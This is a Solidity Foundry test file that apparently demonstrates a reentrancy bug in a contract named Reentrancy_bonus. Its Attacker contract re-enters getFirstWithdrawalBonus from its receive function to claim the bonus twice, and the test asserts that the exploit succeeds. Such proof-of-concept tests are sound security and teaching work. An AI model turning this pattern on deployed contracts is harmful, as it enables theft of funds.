
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Reentrancy_bonus} from "../src/Reentrancy_bonus.sol";

contract TestReentrancyReentrancy_bonus is Test {
    Reentrancy_bonus public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_bonus();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // Constrain the fuzz value to a safe range
        vm.assume(attackVal > 0.01 ether && attackVal < type(uint128).max);

        // Fund the victim contract so it has ETH to send as bonus
        vm.deal(address(_contractUnderTest), attackVal * 10);
        
        // Fund the attacker contract
        vm.deal(address(_attacker), attackVal);

        // Fund the test contract
        vm.deal(address(this), attackVal);

        // Trigger the attack
        _attacker.attack();

        // Verify the reentrancy exploit succeeded
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy_bonus public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public bonusReceivedCount;

    constructor(address victimAddress) { 
        _victim = Reentrancy_bonus(victimAddress);
    }

    function attack() public {
        // Reset state for the attack
        attackCallCount = 0;
        bonusReceivedCount = 0;
        exploitSucceeded = false;

        // Call the vulnerable function - this should only allow one bonus per address
        // but due to reentrancy, we can claim multiple times
        _victim.getFirstWithdrawalBonus(address(this));

        // If we received the bonus more than once, the exploit succeeded
        if (bonusReceivedCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        bonusReceivedCount++;
        
        // Re-enter before claimedBonus[recipient] is set to true
        // The vulnerability: claimedBonus is set AFTER the external call
        if (attackCallCount < 1) {
            attackCallCount++;
            // Re-enter the vulnerable function
            _victim.getFirstWithdrawalBonus(address(this));
        }
    }
}
